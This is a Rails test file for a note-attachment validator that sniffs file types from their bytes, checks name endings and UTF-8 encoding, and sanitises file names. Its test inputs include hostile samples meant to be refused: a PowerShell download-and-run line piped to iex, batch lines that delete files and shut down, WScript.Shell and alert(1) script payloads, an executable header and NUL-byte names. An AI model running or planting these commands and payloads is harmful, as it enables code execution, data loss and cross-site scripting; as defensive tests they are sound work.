require "test_helper"
require "support/note_files_helper"

class Notes::FilesTest < ActiveSupport::TestCase
  include NoteFilesHelper

  def type(content, name = "file") = Notes::Files.type_of(note_upload(content, name))

  def refused(name) = [ "#{name}: this type of file can't be attached." ]

  def errors(content, name, declared = "application/octet-stream") = Notes::Files.errors_for([ note_upload(content, name, declared) ])

  def wrong_ending(name, kind, endings) = [ "#{name}: a #{kind} file's name must end in #{endings}." ]

  TEXT_ENDINGS = ".txt, .md, .log or .csv".freeze

  test "the type is what the bytes are" do
    assert_equal "image/png", Notes::Files.type_of(fixture_upload("tiny.png"))
    assert_equal "image/gif", Notes::Files.type_of(fixture_upload("small.gif"))
    assert_equal "application/pdf", type(PDF, "report.pdf")
    assert_equal "text/plain", type("Just some text.\nSecond line.\n", "notes.txt")
    assert_equal "text/csv", type("a,b\n1,2\n", "table.csv")
  end

  # What Marcel answers for these was never run when the plan was written:
  # each is asked here with the bytes of a real, smallest file of the format.
  test "plain text and CSV have no signature and are told by being text; a UTF-8 byte order mark is taken off first" do
    assert_equal "application/octet-stream", Marcel::MimeType.for(StringIO.new("Just some text.\n"))
    assert_equal "application/octet-stream", Marcel::MimeType.for(StringIO.new("a,b\n1,2\n"))
    assert_equal "text/plain", Marcel::MimeType.for(StringIO.new("\xEF\xBB\xBFa,b\n1,2\n".b))

    assert_equal "text/plain", type("Grüße aus Köln — ünïcödé\n", "notes.md")
    assert_equal "text/plain", type("a,b\n1,2\n", "table.TXT") # the ending picks the type among the two of text
    assert_equal "text/csv", type("\xEF\xBB\xBFa,b\n1,2\n".b, "export.CSV") # a spreadsheet's export
    assert_equal "text/plain", type("é" * 40_000, "long.log") # the sample ends inside a character
    assert_nil type("", "empty.txt")
    assert_nil type("text\x00with a NUL".b, "odd.txt")
  end

  test "text that is not UTF-8 is refused with a sentence of its own, under a text file's name" do
    encoding = ->(name) { [ "#{name}: text and CSV files must be saved as UTF-8." ] }

    assert_equal encoding.call("latin.csv"), errors("caf\xE9;Stra\xDFe\n".b, "latin.csv", "text/csv")
    assert_equal encoding.call("latin.txt"), errors("caf\xE9 in Latin-1".b, "latin.txt")
    assert_equal encoding.call("utf16.txt"), errors("\xFF\xFEh\x00i\x00".b, "utf16.txt") # Marcel calls it text by its mark
    assert_equal encoding.call("utf16be.csv"), errors("\xFE\xFF\x00a\x00,\x00b".b, "utf16be.csv")
    # Under any other name it is simply not an allowed kind of file.
    assert_equal refused("data.bin"), errors("caf\xE9".b, "data.bin")
  end

  test "the Office and OpenDocument formats of today are told from their archives" do
    types = Notes::Files::ALLOWED.invert
    NoteFilesHelper::OFFICE.each_key { |extension| assert_equal types.fetch(extension.upcase), type(office_bytes(extension), "file.#{extension}"), extension }
    NoteFilesHelper::OPEN_DOCUMENT.each_key { |extension| assert_equal types.fetch(extension.upcase), type(open_document_bytes(extension), "file.#{extension}"), extension }
  end

  test "every allowed type has its endings, and each ending is taken" do
    assert_equal Notes::Files::ALLOWED.keys.sort, Notes::Files::EXTENSIONS.keys.sort
    samples = { "image/png" => file_fixture("tiny.png").binread, "image/gif" => file_fixture("small.gif").binread, "application/pdf" => PDF,
      "text/plain" => "Text.\n", "text/csv" => "a,b\n" }
    samples.each do |content_type, bytes|
      Notes::Files::EXTENSIONS.fetch(content_type).each { |ending| assert_equal content_type, type(bytes, "file.#{ending.upcase}"), ending }
    end
  end

  test "a zip that is no document is refused under a document's name, and so are the legacy Office formats" do
    page_in_a_zip = stored_zip([ [ "index.html", HTML ], [ "word/document.xml", "<document/>" ] ])
    jar = stored_zip([ [ "META-INF/MANIFEST.MF", "Manifest-Version: 1.0\n" ] ])
    epub = stored_zip([ [ "mimetype", "application/epub+zip" ] ])
    legacy = "\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1".b + ("\x00".b * 600)

    { "report.docx" => page_in_a_zip, "sheet.xlsx" => jar, "slides.odp" => epub, "letter.doc" => legacy, "archive.zip" => page_in_a_zip }.each do |name, bytes|
      declared = "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
      assert_equal refused(name), errors(bytes, name, declared), name
    end
  end

  # Review Focus 5.
  test "a file is refused by what it is, whatever it is called and whatever the browser said" do
    assert_equal refused("report.pdf"), errors(HTML, "report.pdf", "application/pdf")
    assert_equal refused("page.docx"), errors("<html><body>Hello</body></html>", "page.docx")
    assert_equal refused("logo.png"), Notes::Files.errors_for([ fixture_upload("tiny.svg", name: "logo.png", declared: "image/png") ])
    assert_equal refused("drawing.txt"), errors('<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"/>', "drawing.txt", "text/plain")
    assert_equal refused("tool.txt"), errors("MZ\x90\x00\x03\x00\x00\x00".b + ("\x00".b * 64), "tool.txt", "text/plain")
    assert_equal refused("run.txt"), errors("#!/bin/sh\necho hi\n", "run.txt", "text/plain")
  end

  # Marcel calls anything behind a byte order mark text. The mark is taken
  # off and what follows is asked again; UTF-16 is not UTF-8.
  test "markup behind a byte order mark is refused as markup, and markup in UTF-16 as not UTF-8" do
    mark = "\xEF\xBB\xBF".b
    utf16 = "\xFF\xFE".b + "<html><body><script>alert(1)</script></body></html>".encode("UTF-16LE").b

    assert_equal "text/plain", Marcel::MimeType.for(StringIO.new(mark + HTML.b))
    assert_equal "text/plain", Marcel::MimeType.for(StringIO.new(utf16))
    assert_equal refused("page.txt"), errors(mark + HTML.b, "page.txt", "text/plain")
    assert_equal refused("page.txt"), errors(mark + "<html><body>Hello</body></html>".b, "page.txt")
    assert_equal refused("drawing.txt"), errors(mark + file_fixture("tiny.svg").binread, "drawing.txt")
    assert_equal refused("drawing.csv"), errors(mark + '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'.b, "drawing.csv")
    assert_equal [ "page.txt: text and CSV files must be saved as UTF-8." ], errors(utf16, "page.txt", "text/plain")
    assert_equal refused("page.html"), errors(utf16, "page.html", "text/html")
  end

  # The bytes decide the stored type; a person downloads the file under its
  # NAME. A name that is not one of its type's is refused, and the sentence
  # says which endings the type may have.
  test "a file whose name does not end as its type's names do is refused: scripts as text, a macro file, a picture named as text" do
    assert_equal wrong_ending("page.html", "text", TEXT_ENDINGS), errors("<body onload=alert(1)>", "page.html", "text/html")
    assert_equal wrong_ending("run.hta", "text", TEXT_ENDINGS), errors("<script>new ActiveXObject('WScript.Shell')</script>", "run.hta")
    assert_equal wrong_ending("setup.ps1", "text", TEXT_ENDINGS), errors("Invoke-WebRequest https://example.com | iex\n", "setup.ps1")
    assert_equal wrong_ending("start.cmd", "text", TEXT_ENDINGS), errors("del /q *\r\nshutdown /s\r\n", "start.cmd")
    assert_equal refused("start.cmd"), errors("@echo off\r\ndel /q *\r\n", "start.cmd") # a batch file's own signature
    assert_equal wrong_ending("notes.pdf", "text", TEXT_ENDINGS), errors("Just some text.\n", "notes.pdf", "application/pdf")
    assert_equal wrong_ending("README", "text", TEXT_ENDINGS), errors("No ending at all.\n", "README")
    assert_equal wrong_ending("report.docm", "DOCX", ".docx"), errors(office_bytes("docx"), "report.docm")
    assert_equal wrong_ending("sheet.xlsm", "XLSX", ".xlsx"), errors(office_bytes("xlsx"), "sheet.xlsm")
    assert_equal wrong_ending("shot.txt", "PNG", ".png"), Notes::Files.errors_for([ fixture_upload("tiny.png", name: "shot.txt", declared: "text/plain") ])
    assert_equal wrong_ending("photo.png", "GIF", ".gif"), Notes::Files.errors_for([ fixture_upload("small.gif", name: "photo.png") ])
    assert_equal wrong_ending("page.html", "PDF", ".pdf"), errors(PDF, "page.html", "text/html")
    assert_equal wrong_ending("report.pdf.exe", "PDF", ".pdf"), errors(PDF, "report.pdf.exe")
    assert_empty errors(file_fixture("tiny.png").binread, "Shot.PNG")
  end

  test "five files at most, ten megabytes each, said from the constants" do
    six = Array.new(6) { |index| note_upload("text #{index}", "f#{index}.txt") }
    assert_equal [ "A note can carry at most 5 files." ], Notes::Files.errors_for(six)

    big = note_upload("a" * (10.megabytes + 1), "big.txt")
    assert_equal [ "big.txt: files can be at most 10 MB." ], Notes::Files.errors_for([ big ])
    assert_empty Notes::Files.errors_for([ note_upload("a" * 10.megabytes, "full.txt") ])
    assert_empty Notes::Files.errors_for([])
    assert_equal [ 5, "10 MB" ], [ Notes::Files::MAX_COUNT, Notes::Files.max_size ]
  end

  test "a refusal repeats at most eighty characters of a file's name" do
    error = Notes::Files.errors_for([ note_upload(HTML, "#{"long" * 40}.pdf") ]).sole

    assert_operator error.length, :<, 130
  end

  test "a stored name is sanitised and at most 255 characters, its ending kept" do
    assert_equal "#{"n" * 251}.png", Notes::Files.stored_name("#{"n" * 400}.png")
    assert_equal "a-b.txt", Notes::Files.stored_name("a/b.txt")
    assert_equal "png", Notes::Files.extension_of("#{"n" * 400}.PNG")
  end

  # `File.extname` raises on a NUL byte ("path name contains null byte"),
  # which Active Storage's sanitising leaves in: a forged multipart part was
  # a 500. The byte is no part of any name.
  test "a NUL byte in a file's name is dropped, never raised on" do
    assert_equal "ab.txt", Notes::Files.stored_name("a\0b.txt")
    assert_equal "txt", Notes::Files.extension_of("a\0b.t\0xt")
    assert_equal "#{"n" * 251}.png", Notes::Files.stored_name("#{"n" * 400}\0.png")

    # A byte that is not UTF-8 (a client sending Latin-1 names): `String#delete`
    # raises on a broken string, so taking the NUL out made THAT name a 500
    # where it had been accepted. It is scrubbed first, as Active Storage's
    # own sanitising would have left it.
    assert_equal ActiveStorage::Filename.new("a\xFFb.txt".dup.force_encoding("UTF-8")).sanitized, Notes::Files.stored_name("a\xFFb.txt".dup.force_encoding("UTF-8"))
    assert_equal "txt", Notes::Files.extension_of("a\xFF\0b.txt".dup.force_encoding("UTF-8"))
    broken = ActionDispatch::Http::UploadedFile.new(tempfile: note_upload("plain words\n", "notes.txt", "text/plain").tempfile, filename: "caf\xE9\0.txt".dup.force_encoding("UTF-8"), type: "text/plain")
    assert_empty Notes::Files.errors_for([ broken ])

    # As a forged multipart part would name it.
    plain = note_upload("plain words\n", "notes.txt", "text/plain")
    upload = ActionDispatch::Http::UploadedFile.new(tempfile: plain.tempfile, filename: "no\0tes.txt", type: "text/plain")
    assert_empty Notes::Files.errors_for([ upload ])
  end
end
